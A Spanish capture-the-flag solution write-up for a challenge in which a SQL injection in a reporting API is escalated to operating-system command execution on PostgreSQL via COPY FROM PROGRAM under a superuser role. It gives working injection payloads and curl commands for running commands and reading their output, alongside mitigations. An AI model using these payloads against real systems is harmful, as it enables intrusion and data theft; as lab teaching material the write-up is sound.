# Solucion — pwn-pgrce-01 · MoneyPipe

**Categoria:** pwn · **Dificultad:** insane · **Puntos:** 700
**Vuln central:** SQL injection en una API de reportes que se **escala a RCE
en el servidor de base de datos** (PostgreSQL) via `COPY ... FROM PROGRAM`,
gracias a que la app conecta a Postgres como **superuser**.

## Historia

MoneyPipe es el pipeline ETL de una fintech que consolida transacciones de
varios bancos en un data warehouse PostgreSQL y expone reportes via una API
interna. Durante una brecha real, el equipo de seguridad descubrio que el
servicio de reportes concatenaba sin sanitizar el parametro de filtrado en
sus consultas SQL. Peor aun: por comodidad operativa, el rol que usaba el
pipeline para conectarse al warehouse era **superuser** de Postgres (un
patron desafortunadamente comun en despliegues ETL apresurados).

Un atacante no se conformo con leer transacciones: uso la inyeccion para
ejecutar `COPY ... FROM PROGRAM`, que en Postgres ejecuta comandos del sistema
operativo **como el usuario `postgres`** en el host de la base de datos. Con
eso obtuvo ejecucion remota de codigo en el servidor del warehouse y exfiltro
los secretos que la fintech guardaba como archivos en ese contenedor. Tu
objetivo es reproducir esa cadena: la flag vive como archivo `/flag.txt`
**dentro del contenedor de PostgreSQL** — no esta en la base de datos ni en
la API. Solo el RCE la alcanza.

## Topologia

```
jugador ──> api (FastAPI, .40:8080) ──> db (postgres:16, .140)
                                          rol app = SUPERUSER
                                          /flag.txt  <-- objetivo del RCE
```

El jugador solo habla con la **api** (`http://<host>:8080`). Postgres no se
expone (sin `ports:`); la api conecta por `db:5432`.

## La cadena (3 pasos)

| # | Capa | Fallo | Efecto |
|---|------|-------|--------|
| 1 | API (FastAPI) | **SQL injection**: `GET /api/v1/reports?filter=...` concatena `filter` crudo en el `WHERE`. Sin parametrizacion. Errores SQL devueltos al cliente. | UNION-based + sentencias apiladas (`;`). |
| 2 | DB (PostgreSQL) | **Rol superuser**: la app conecta como `moneypipe_etl` que es `SUPERUSER`. `COPY ... TO/FROM PROGRAM` solo lo permite un superuser. | RCE: ejecuta comandos del SO como `postgres` en el contenedor db. |
| 3 | Exfiltracion | La salida del comando se vuelca en una tabla y se lee con una segunda SQLi UNION. | La flag (archivo `/flag.txt`) llega a la respuesta JSON. |

## Explotacion paso a paso

### Paso 0 — Recon de la SQLi y numero de columnas

La consulta base es `SELECT id, account, region, currency, amount, status
FROM transactions WHERE <filter>`. Son **6 columnas** (int, text, text, text,
numeric, text). Confirmamos la inyeccion con un UNION compatible:

```
GET /api/v1/reports?filter=1=2 UNION SELECT 1,'a','b','c',4,'e'-- -
```

Devuelve una fila `{id:1, account:"a", ...}` → SQLi UNION confirmada. Un
filtro mal formado devuelve el error de Postgres en `detail` (SQLi basada en
errores, util para mapear el esquema).

### Paso 1 — Escalar a RCE con `COPY ... FROM PROGRAM`

Como el rol es superuser, podemos pedirle a Postgres que ejecute un comando
del SO y meta su salida en una tabla. Usamos **sentencias apiladas** (psycopg2
ejecuta toda la cadena separada por `;` en un solo `execute`); la ultima
sentencia es un `COPY` que no devuelve filas, asi que el handler no intenta
hacer `fetch`:

```
GET /api/v1/reports?filter=1=1; DROP TABLE IF EXISTS exfil; CREATE TABLE exfil(line text); COPY exfil(line) FROM PROGRAM 'cat /flag.txt'-- -
```

`COPY ... FROM PROGRAM 'cat /flag.txt'` ejecuta `cat /flag.txt` como el
usuario `postgres` del SO **dentro del contenedor db** y vuelca cada linea de
salida como una fila en `exfil`. Esto es RCE en el servidor de base de datos.

> Nota: el comando puede ser cualquiera (`id`, `uname -a`, una reverse shell,
> etc.). Aqui basta con leer la flag. Variante equivalente:
> `COPY exfil(line) FROM PROGRAM 'cat /flag.txt; id; hostname'`.

### Paso 2 — Recuperar la salida (segunda SQLi UNION)

La tabla `exfil` persiste en la base. Una segunda peticion la lee con UNION;
`line` cae en el campo `account` de la respuesta:

```
GET /api/v1/reports?filter=1=2 UNION SELECT 1, line, 'x','x',0,'x' FROM exfil-- -
```

Respuesta:

```json
{"rows":[{"id":1,"account":"HL4{...}","region":"x","currency":"x","amount":0,"status":"x"}]}
```

→ **flag** en `account`.

## Exploit automatizado

```bash
python solution/exploit.py http://<host>:8080
```

Hace recon (paso 0), el `COPY FROM PROGRAM` (paso 1) y la exfiltracion UNION
(paso 2), e imprime `[+] FLAG: HL4{...}`.

## Verificacion manual (curl)

```bash
# 1) RCE: volcar la flag en una tabla puente
curl -s "http://<host>:8080/api/v1/reports" \
  --data-urlencode "filter=1=1; DROP TABLE IF EXISTS exfil; CREATE TABLE exfil(line text); COPY exfil(line) FROM PROGRAM 'cat /flag.txt'-- -" -G

# 2) exfiltrar la salida via UNION
curl -s "http://<host>:8080/api/v1/reports" \
  --data-urlencode "filter=1=2 UNION SELECT 1, line, 'x','x',0,'x' FROM exfil-- -" -G
```

## Por que es INSANE

- No basta con una SQLi de lectura: la flag **no esta en la base de datos**,
  asi que `UNION SELECT` sobre tablas normales nunca la encuentra. Hay que
  darse cuenta de que el objetivo esta en el **sistema de archivos del
  contenedor de Postgres**.
- Requiere conocer una tecnica de **pos-explotacion real de PostgreSQL**
  (`COPY ... TO/FROM PROGRAM`) y la precondicion de **superuser**, e
  inferir que el rol de la app lo es.
- Hay que **encadenar dos consultas distintas**: una que ejecuta el comando
  (no devuelve filas) y otra que recupera su salida (UNION), entendiendo el
  mapeo de columnas/tipos de la respuesta.

## Referencia (tecnica real)

`COPY ... TO/FROM PROGRAM` es una via documentada de RCE en PostgreSQL cuando
una SQLi corre bajo un rol superuser (o miembro de `pg_execute_server_program`).
Se ha usado en brechas reales de aplicaciones que conectan a la base con
privilegios excesivos. Postgres 11+ restringe `PROGRAM` a superusers y a ese
rol predefinido — por eso la mala configuracion del privilegio es la clave.

## Mitigaciones (didactico)

- **API**: consultas **parametrizadas** siempre (`cur.execute(sql, params)`),
  nunca concatenacion de entrada del usuario en SQL. Validar/allow-list los
  campos de filtrado. No devolver errores SQL crudos al cliente.
- **DB**: **principio de minimo privilegio**. La app jamas debe conectar como
  superuser; usar un rol sin `SUPERUSER` ni pertenencia a
  `pg_execute_server_program`, con permisos solo sobre las tablas necesarias.
- **Defensa en profundidad**: el contenedor de Postgres no deberia contener
  secretos en el sistema de archivos accesibles al proceso `postgres`.

## Nota anti-cheat

- La flag es **dinamica y unica por equipo** (HMAC del flag-service,
  `ARCHITECTURE §4`), inyectada por env `FLAG` en cada instancia. El
  entrypoint del contenedor `db` la escribe en `/flag.txt` en runtime; **no**
  esta en la imagen ni hardcodeada.
- Compartir el metodo no da puntos: cada equipo debe explotar SU propia
  instancia para SU flag. Enviar la flag de otro equipo dispara
  `cheat_flag_share` (`/whose-flag`).
- La SQLi/`COPY`/`UNION` emiten eventos SIEM (`scan_detected` alert) al
  collector; todas las peticiones del jugador a la API se loguean como
  `CTFREQ` (reqlog ASGI puro) para el overlay del stream.
```
